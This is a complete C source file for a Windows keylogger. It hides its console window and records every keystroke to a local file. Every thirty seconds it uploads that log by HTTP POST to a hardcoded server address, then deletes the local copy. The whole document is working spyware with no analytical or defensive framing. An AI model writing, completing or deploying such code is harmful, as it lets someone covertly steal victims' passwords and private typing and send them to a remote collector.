#include <windows.h>
#include <winhttp.h>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>

#define SERVER_NAME L"192.168.43.178"
#define SERVER_PORT INTERNET_DEFAULT_HTTP_PORT
#define SERVER_PATH L"/upload"
#define UPLOAD_INTERVAL 30  // seconds

const wchar_t *logFilename = L"keys.log";

void logKeyLocally(wchar_t key) {
    FILE *file = _wfopen(logFilename, L"a+");
    if (file) {
        fwprintf(file, L"%c", key);
        fclose(file);
    }
}

void send_file_to_server() {
    FILE *file = _wfopen(logFilename, L"rb");
    if (!file) return;

    fseek(file, 0, SEEK_END);
    long filesize = ftell(file);
    if (filesize == 0) {
        fclose(file);
        return; // nothing to send
    }
    fseek(file, 0, SEEK_SET);

    char *filedata = (char *)malloc(filesize);
    fread(filedata, 1, filesize, file);
    fclose(file);

    const char *boundary = "----KeyLoggerBoundary123456";
    char header[512];
    snprintf(header, sizeof(header),
             "--%s\r\n"
             "Content-Disposition: form-data; name=\"file\"; filename=\"keys.log\"\r\n"
             "Content-Type: text/plain\r\n\r\n",
             boundary);

    const char *footerFmt = "\r\n--%s--\r\n";
    size_t footerLen = strlen(footerFmt) + strlen(boundary) + 1;
    char *footer = (char *)malloc(footerLen);
    snprintf(footer, footerLen, footerFmt, boundary);

    size_t bodyLen = strlen(header) + filesize + strlen(footer);
    char *body = (char *)malloc(bodyLen);
    memcpy(body, header, strlen(header));
    memcpy(body + strlen(header), filedata, filesize);
    memcpy(body + strlen(header) + filesize, footer, strlen(footer));

    free(filedata);
    free(footer);

    HINTERNET hSession = WinHttpOpen(L"KeyloggerUploader/1.0", WINHTTP_ACCESS_TYPE_NO_PROXY, NULL, NULL, 0);
    if (!hSession) {
        free(body);
        return;
    }

    HINTERNET hConnect = WinHttpConnect(hSession, SERVER_NAME, SERVER_PORT, 0);
    if (!hConnect) {
        WinHttpCloseHandle(hSession);
        free(body);
        return;
    }

    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", SERVER_PATH, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
    if (!hRequest) {
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        free(body);
        return;
    }

    wchar_t contentType[256];
    swprintf(contentType, 256, L"Content-Type: multipart/form-data; boundary=%hs", boundary);
    WinHttpAddRequestHeaders(hRequest, contentType, -1, WINHTTP_ADDREQ_FLAG_ADD);

    BOOL sent = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                                   body, (DWORD)bodyLen, (DWORD)bodyLen, 0);

    free(body);

    if (sent) {
        WinHttpReceiveResponse(hRequest, NULL);
        _wremove(logFilename); // delete after sending
    }

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
}

int main() {
    ShowWindow(GetConsoleWindow(), SW_HIDE); // hide console window
    time_t lastUploadTime = time(NULL);

    while (1) {
        Sleep(10);

        for (int key = 8; key <= 255; key++) {
            if (GetAsyncKeyState(key) & 0x0001) {
                wchar_t c = (wchar_t)key;

                if (key == VK_RETURN) c = L'\n';
                else if (key == VK_SPACE) c = L' ';
                else if (key == VK_TAB) c = L'\t';

                logKeyLocally(c);
            }
        }

        time_t currentTime = time(NULL);
        if (difftime(currentTime, lastUploadTime) >= UPLOAD_INTERVAL) {
            send_file_to_server();
            lastUploadTime = currentTime;
        }
    }
    return 0;
}
